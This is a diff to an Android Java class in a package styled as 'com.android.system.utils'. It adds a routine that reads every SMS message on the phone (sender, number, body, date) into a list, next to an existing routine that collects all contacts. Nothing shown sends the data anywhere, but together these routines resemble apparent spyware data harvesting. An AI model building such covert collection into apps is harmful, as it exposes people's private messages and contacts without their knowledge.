@@ -3,10 +3,13 @@ package com.android.system.utils;
 import android.app.ActivityManager;
 import android.content.Context;
 import android.database.Cursor;
+import android.net.Uri;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 public class SystemUtil {
@@ -26,7 +29,7 @@ public class SystemUtil {
         return result;
     }
 
-    public static List<String> getContactAllName(Context context) {
+    public static List<String> getAllContact(Context context) {
         List<String> numberList = new ArrayList<>();
         Cursor cursor = context.getContentResolver().query(
                 ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -87,5 +90,41 @@ public class SystemUtil {
         } catch(Exception e) {
         }
         return isRunning;
+    }
+
+    public static class SmsData {
+        public String person = null;
+        public String address = null;
+        public String body = null;
+        public String date = null;
+        public int type = 0;
+    }
+    public static List<SmsData> getSmsInPhone(Context context)
+    {
+        List<SmsData> smsList = new ArrayList<>();
+
+        String SMS_URI_ALL   = "content://sms/";
+        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
+        Cursor cur = context.getContentResolver().query(Uri.parse(SMS_URI_ALL), projection, null, null, "date desc");
+
+        int nameColumn = cur.getColumnIndex("person");
+        int phoneNumberColumn = cur.getColumnIndex("address");
+        int bodyColumn = cur.getColumnIndex("body");
+        int dateColumn = cur.getColumnIndex("date");
+        int typeColumn = cur.getColumnIndex("type");
+
+        while(cur.moveToNext()) {
+            SmsData sms = new SmsData();
+            try {
+                sms.person = cur.getString(nameColumn);
+                sms.address = cur.getString(phoneNumberColumn);
+                sms.body = cur.getString(bodyColumn);
+                sms.date = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(Long.parseLong(cur.getString(dateColumn))));
+                sms.type = cur.getInt(typeColumn);
+            } catch(Exception e) {
+            }
+            smsList.add(sms);
+        }
+        return smsList;
     }
 }
